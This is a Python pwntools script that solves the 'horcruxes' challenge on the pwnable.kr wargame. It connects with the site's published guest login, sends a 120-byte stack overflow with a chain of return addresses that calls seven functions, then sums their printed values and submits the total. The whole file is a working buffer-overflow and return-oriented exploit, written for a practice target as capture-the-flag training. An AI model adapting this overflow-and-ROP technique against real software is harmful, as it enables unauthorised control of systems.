#!/usr/bin/env python3

import pwn, re
from numpy import int32

ssh = pwn.ssh(host = 'pwnable.kr', user = 'horcruxes', password = 'guest', port = 2222)
io = ssh.remote('localhost', 9032)
io.recvuntil(':')

payload = b'A' * 120 + pwn.p32(0x809fe4b) + pwn.p32(0x809fe6a) + pwn.p32(0x809fe89)\
+ pwn.p32(0x809fea8) + pwn.p32(0x809fec7) + pwn.p32(0x809fee6) + pwn.p32(0x809ff05) + pwn.p32(0x809fffc)

io.sendline('0')
io.recvuntil(': ')
io.sendline(payload)
io.recvuntil('Voldemort\n')

total = 0
pat = re.compile('You found ".*" \(EXP \+([-\d]*)\)')
for _ in range(7):
	msg = io.recvline().decode()
	num = int(pat.match(msg).group(1))
	total += num

total = int32(total)
io.recvuntil(':')
io.sendline('0')
io.recvuntil(': ')
io.sendline(str(total))
print(io.recvline().decode())
